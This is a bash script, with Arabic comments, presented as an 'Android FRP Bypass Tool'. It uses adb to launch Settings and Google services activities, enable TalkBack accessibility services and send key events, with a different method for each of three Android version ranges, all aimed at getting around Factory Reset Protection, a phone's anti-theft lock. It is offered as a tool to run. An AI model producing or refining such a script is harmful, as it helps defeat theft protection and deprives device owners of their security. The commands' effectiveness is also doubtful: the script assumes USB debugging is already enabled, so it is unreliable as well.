#!/bin/bash

echo "Android FRP Bypass Tool"
echo "========================"

# التحقق من اتصال الجهاز
check_device() {
    if adb devices | grep -q "device$"; then
        echo "✅ Device connected"
        return 0
    else
        echo "❌ No device connected"
        echo "Enable USB Debugging first"
        return 1
    fi
}

# طريقة تجاوز Android 7-9
bypass_old() {
    echo "[*] Method: TalkBack/Keyboard Bypass"
    adb shell am start -a android.intent.action.MAIN -n com.android.settings/.Settings
    sleep 2
    adb shell input keyevent KEYCODE_HOME
    sleep 1
    adb shell am start -n com.google.android.gms/.auth.setup.device.DeviceManagementActivity
}

# طريقة تجاوز Android 10-12
bypass_mid() {
    echo "[*] Method: Accessibility Menu Bypass"
    adb shell settings put secure accessibility_enabled 1
    adb shell settings put secure enabled_accessibility_services com.google.android.marvin.talkback/com.google.android.marvin.talkback.TalkBackService
    adb shell am start -a android.intent.action.MAIN -n com.google.android.apps.accessibility.auditor/.MainActivity
}

# طريقة تجاوز Android 13-16
bypass_new() {
    echo "[*] Method: Split Screen + Settings"
    adb shell am start -a android.intent.action.MAIN -n com.android.settings/.Settings\$SecuritySettings
    sleep 3
    adb shell input keyevent KEYCODE_APP_SWITCH
    sleep 1
    adb shell am start -n com.android.settings/.Settings\$DeviceAdminSettingsActivity
}

# قائمة التشغيل
echo "Select Android Version:"
echo "1) Android 7-9"
echo "2) Android 10-12"
echo "3) Android 13-16"
read -p "Choice: " choice

check_device && {
    case $choice in
        1) bypass_old ;;
        2) bypass_mid ;;
        3) bypass_new ;;
        *) echo "Invalid choice" ;;
    esac
}
